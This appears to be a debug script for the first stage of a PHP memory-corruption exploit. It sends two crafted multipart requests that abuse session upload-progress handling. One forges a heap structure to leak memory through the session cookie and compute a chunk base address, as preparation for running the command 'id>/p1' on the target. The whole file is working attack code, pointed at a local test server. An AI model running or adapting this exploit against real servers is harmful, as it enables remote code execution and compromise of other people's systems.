#!/usr/bin/env python3
"""Debug stage-1: capture raw responses of the two-part leak sequence."""
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import (Target, Exploit, build_multipart, parse_cookie,
                     chunk_base_from_cookie, SID)

t = Target("http://127.0.0.1:18113/index.php", timeout=120.0)
ex = Exploit(t, "id>/p1", htdata_offset=0x690d8, profile="bookworm")

# ---- request A (worker priming) ----
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ex._file_part(),
    ex._big_field(),
]
body = build_multipart(parts, b"S" * 17)
print(f"[*] req A: {len(body)} bytes, {len(parts)} parts", flush=True)
respA = t.post(body, b"S" * 17, read_cap=9 << 20)
print(f"[*] resp A: {len(respA)} bytes", flush=True)
head, _, bA = respA.partition(b"\r\n\r\n")
print("---- respA headers ----")
print(head.decode("latin1", "replace")[:1500])
print("---- respA body (first 800) ----")
print(bA[:800].decode("latin1", "replace"))

time.sleep(0.2)

# ---- request B (leak) ----
parts = [
    {"name": "PHPSESSID", "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(ex.stage1_n):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
import struct
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})

body = build_multipart(parts, b"B" * 10)
print(f"[*] req B: {len(body)} bytes, {len(parts)} parts", flush=True)
respB = t.post(body, b"B" * 10, read_cap=9 << 20)
print(f"[*] resp B: {len(respB)} bytes", flush=True)
head, _, bB = respB.partition(b"\r\n\r\n")
print("---- respB headers ----")
print(head.decode("latin1", "replace")[:1500])
cookie = parse_cookie(respB)
print(f"[*] cookie len: {len(cookie)}", flush=True)
if cookie:
    print("cookie head:", cookie[:128])
    base = chunk_base_from_cookie(cookie)
    print(f"[*] chunk_base_from_cookie -> 0x{base:x}", flush=True)
print("---- respB body (first 800) ----")
print(bB[:800].decode("latin1", "replace"))
